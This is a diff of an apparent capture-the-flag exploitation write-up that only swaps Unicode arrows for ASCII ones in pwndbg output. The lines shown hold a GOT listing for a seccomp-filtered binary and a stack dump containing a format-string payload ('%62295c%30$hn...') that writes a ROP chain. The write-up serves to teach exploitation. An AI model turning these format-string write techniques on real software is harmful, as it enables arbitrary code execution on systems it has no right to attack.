@@ -184,22 +184,22 @@ Filtering out read-only entries (display them with -r or --show-readonly)
 
 State of the GOT of /home/user/files/dist/analyzer_patched:
 GOT protection: Partial RELRO | Found 16 GOT entries passing the filter
-[0x404018] free@GLIBC_2.2.5 -> 0x401030 ◂— endbr64
-[0x404020] seccomp_init -> 0x7f0187f86760 (seccomp_init) ◂— endbr64
-[0x404028] putchar@GLIBC_2.2.5 -> 0x401050 ◂— endbr64
-[0x404030] seccomp_rule_add -> 0x7f0187f87ab0 (seccomp_rule_add) ◂— endbr64
-[0x404038] puts@GLIBC_2.2.5 -> 0x7f0187c80e50 (puts) ◂— endbr64
-[0x404040] seccomp_load -> 0x7f0187f86f40 (seccomp_load) ◂— endbr64
-[0x404048] strlen@GLIBC_2.2.5 -> 0x7f0187d9d860 (__strlen_avx2) ◂— endbr64
-[0x404050] __stack_chk_fail@GLIBC_2.4 -> 0x4010a0 ◂— endbr64
-[0x404058] printf@GLIBC_2.2.5 -> 0x7f0187c606f0 (printf) ◂— endbr64
-[0x404060] seccomp_release -> 0x4010c0 ◂— endbr64
-[0x404068] memset@GLIBC_2.2.5 -> 0x7f0187da1000 (__memset_avx2_unaligned_erms) ◂— endbr64
-[0x404070] strcspn@GLIBC_2.2.5 -> 0x7f0187d98610 (__strcspn_sse42) ◂— endbr64
-[0x404078] malloc@GLIBC_2.2.5 -> 0x7f0187ca50a0 (malloc) ◂— endbr64
-[0x404080] setvbuf@GLIBC_2.2.5 -> 0x7f0187c815f0 (setvbuf) ◂— endbr64
-[0x404088] getline@GLIBC_2.2.5 -> 0x7f0187c61db0 (getline) ◂— endbr64
-[0x404090] exit@GLIBC_2.2.5 -> 0x401120 ◂— endbr64
+[0x404018] free@GLIBC_2.2.5 -> 0x401030 <- endbr64
+[0x404020] seccomp_init -> 0x7f0187f86760 (seccomp_init) <- endbr64
+[0x404028] putchar@GLIBC_2.2.5 -> 0x401050 <- endbr64
+[0x404030] seccomp_rule_add -> 0x7f0187f87ab0 (seccomp_rule_add) <- endbr64
+[0x404038] puts@GLIBC_2.2.5 -> 0x7f0187c80e50 (puts) <- endbr64
+[0x404040] seccomp_load -> 0x7f0187f86f40 (seccomp_load) <- endbr64
+[0x404048] strlen@GLIBC_2.2.5 -> 0x7f0187d9d860 (__strlen_avx2) <- endbr64
+[0x404050] __stack_chk_fail@GLIBC_2.4 -> 0x4010a0 <- endbr64
+[0x404058] printf@GLIBC_2.2.5 -> 0x7f0187c606f0 (printf) <- endbr64
+[0x404060] seccomp_release -> 0x4010c0 <- endbr64
+[0x404068] memset@GLIBC_2.2.5 -> 0x7f0187da1000 (__memset_avx2_unaligned_erms) <- endbr64
+[0x404070] strcspn@GLIBC_2.2.5 -> 0x7f0187d98610 (__strcspn_sse42) <- endbr64
+[0x404078] malloc@GLIBC_2.2.5 -> 0x7f0187ca50a0 (malloc) <- endbr64
+[0x404080] setvbuf@GLIBC_2.2.5 -> 0x7f0187c815f0 (setvbuf) <- endbr64
+[0x404088] getline@GLIBC_2.2.5 -> 0x7f0187c61db0 (getline) <- endbr64
+[0x404090] exit@GLIBC_2.2.5 -> 0x401120 <- endbr64
 ```
 
 These GOT entries are _lazily linked_, which entails that the binary will
@@ -411,28 +411,28 @@ addresses to write to. Using `pwndbg`'s `tel` command, this is what that looks
 like:
 
 ```c
-0a:0050│ rdi 0x7fffdf818f60 ◂— '%62295c%30$hn%57690c%31$hn%43782c%32$hn%32841c%33$hn%34$hn%35$hn%36$hn%37$hn'
-0b:0058│-118 0x7fffdf818f68 ◂— '30$hn%57690c%31$hn%43782c%32$hn%32841c%33$hn%34$hn%35$hn%36$hn%37$hn'
-0c:0060│-110 0x7fffdf818f70 ◂— '690c%31$hn%43782c%32$hn%32841c%33$hn%34$hn%35$hn%36$hn%37$hn'
-0d:0068│-108 0x7fffdf818f78 ◂— 'hn%43782c%32$hn%32841c%33$hn%34$hn%35$hn%36$hn%37$hn'
-0e:0070│-100 0x7fffdf818f80 ◂— 'c%32$hn%32841c%33$hn%34$hn%35$hn%36$hn%37$hn'
-0f:0078│-0f8 0x7fffdf818f88 ◂— '32841c%33$hn%34$hn%35$hn%36$hn%37$hn'
-10:0080│-0f0 0x7fffdf818f90 ◂— '3$hn%34$hn%35$hn%36$hn%37$hn'
-11:0088│-0e8 0x7fffdf818f98 ◂— 'hn%35$hn%36$hn%37$hn'
-12:0090│-0e0 0x7fffdf818fa0 ◂— '%36$hn%37$hn'
-13:0098│-0d8 0x7fffdf818fa8 ◂— 0x616161006e682437 /* '7$hn' */
-14:00a0│-0d0 0x7fffdf818fb0 ◂— 0x6161617661616175 ('uaaavaaa')
-15:00a8│-0c8 0x7fffdf818fb8 ◂— 0x6161617861616177 ('waaaxaaa')
-16:00b0│-0c0 0x7fffdf818fc0 ◂— 0x6261617a61616179 ('yaaazaab')
-17:00b8│-0b8 0x7fffdf818fc8 ◂— 0x6261616362616162 ('baabcaab')
-18:00c0│-0b0 0x7fffdf818fd0 —▸ 0x7fffdf819208 —▸ 0x7fb7d4a29d90 (__libc_start_call_main+128) ◂— mov edi, eax
-19:00c8│-0a8 0x7fffdf818fd8 —▸ 0x7fffdf81920a ◂— 0x7fb7d4a2
-1a:00d0│-0a0 0x7fffdf818fe0 —▸ 0x7fffdf81920c ◂— 0x7fb7
-1b:00d8│-098 0x7fffdf818fe8 —▸ 0x7fffdf81920e ◂— 0
-1c:00e0│-090 0x7fffdf818ff0 —▸ 0x7fffdf819210 ◂— 0
-1d:00e8│-088 0x7fffdf818ff8 —▸ 0x7fffdf819212 ◂— 0x1749000000000000
-1e:00f0│-080 0x7fffdf819000 —▸ 0x7fffdf819214 ◂— 0x40174900000000
-1f:00f8│-078 0x7fffdf819008 —▸ 0x7fffdf819216 ◂— 0x4017490000
+0a:0050| rdi 0x7fffdf818f60 <- '%62295c%30$hn%57690c%31$hn%43782c%32$hn%32841c%33$hn%34$hn%35$hn%36$hn%37$hn'
+0b:0058|-118 0x7fffdf818f68 <- '30$hn%57690c%31$hn%43782c%32$hn%32841c%33$hn%34$hn%35$hn%36$hn%37$hn'
+0c:0060|-110 0x7fffdf818f70 <- '690c%31$hn%43782c%32$hn%32841c%33$hn%34$hn%35$hn%36$hn%37$hn'
+0d:0068|-108 0x7fffdf818f78 <- 'hn%43782c%32$hn%32841c%33$hn%34$hn%35$hn%36$hn%37$hn'
+0e:0070|-100 0x7fffdf818f80 <- 'c%32$hn%32841c%33$hn%34$hn%35$hn%36$hn%37$hn'
+0f:0078|-0f8 0x7fffdf818f88 <- '32841c%33$hn%34$hn%35$hn%36$hn%37$hn'
+10:0080|-0f0 0x7fffdf818f90 <- '3$hn%34$hn%35$hn%36$hn%37$hn'
+11:0088|-0e8 0x7fffdf818f98 <- 'hn%35$hn%36$hn%37$hn'
+12:0090|-0e0 0x7fffdf818fa0 <- '%36$hn%37$hn'
+13:0098|-0d8 0x7fffdf818fa8 <- 0x616161006e682437 /* '7$hn' */
+14:00a0|-0d0 0x7fffdf818fb0 <- 0x6161617661616175 ('uaaavaaa')
+15:00a8|-0c8 0x7fffdf818fb8 <- 0x6161617861616177 ('waaaxaaa')
+16:00b0|-0c0 0x7fffdf818fc0 <- 0x6261617a61616179 ('yaaazaab')
+17:00b8|-0b8 0x7fffdf818fc8 <- 0x6261616362616162 ('baabcaab')
+18:00c0|-0b0 0x7fffdf818fd0 -> 0x7fffdf819208 -> 0x7fb7d4a29d90 (__libc_start_call_main+128) <- mov edi, eax
+19:00c8|-0a8 0x7fffdf818fd8 -> 0x7fffdf81920a <- 0x7fb7d4a2
+1a:00d0|-0a0 0x7fffdf818fe0 -> 0x7fffdf81920c <- 0x7fb7
+1b:00d8|-098 0x7fffdf818fe8 -> 0x7fffdf81920e <- 0
+1c:00e0|-090 0x7fffdf818ff0 -> 0x7fffdf819210 <- 0
+1d:00e8|-088 0x7fffdf818ff8 -> 0x7fffdf819212 <- 0x1749000000000000
+1e:00f0|-080 0x7fffdf819000 -> 0x7fffdf819214 <- 0x40174900000000
+1f:00f8|-078 0x7fffdf819008 -> 0x7fffdf819216 <- 0x4017490000
 ```
 In short, for every pointer I write onto the stack, there is an format string
 payload that writes the correct short at that address which achieves the ROP
